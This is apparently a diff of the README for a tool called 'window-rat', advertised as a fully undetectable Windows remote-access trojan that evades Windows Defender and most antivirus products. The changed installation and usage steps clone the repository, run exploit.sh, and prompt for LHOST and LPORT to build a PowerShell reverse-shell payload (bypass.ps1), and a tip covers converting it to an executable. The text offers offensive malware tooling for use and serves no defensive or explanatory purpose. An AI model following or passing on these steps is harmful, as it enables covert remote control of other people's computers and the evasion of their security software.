@@ -16,15 +16,14 @@
     A Fully Undectable Window RAT that bypass window 10 Defender protection and also bypass 99.9% of other antivirus protections.
     
 # Installation:
-    1. cd /opt
-    2. sudo git clone https://github.com/machine1337/window-rat
-    3. sudo chmod +x exploit.sh
+    1.  git clone https://github.com/machine1337/window-rat
+    2. sudo chmod +x exploit.sh
     
 # Usage:
     1. sudo ./exploit.sh
     2. Now enter LHOST (your IP or server in which u want to get reverse shell)
     3. Now enter LPORT (which port u want to connect)
-    4. Your payload will be saved in /opt/output/ folder.
+    4. Your payload will be saved in /window-rat/{bypass.ps1} .
     
 # Bonus Tip:
     This tool generate powershell payload so in order to convert it into exe format
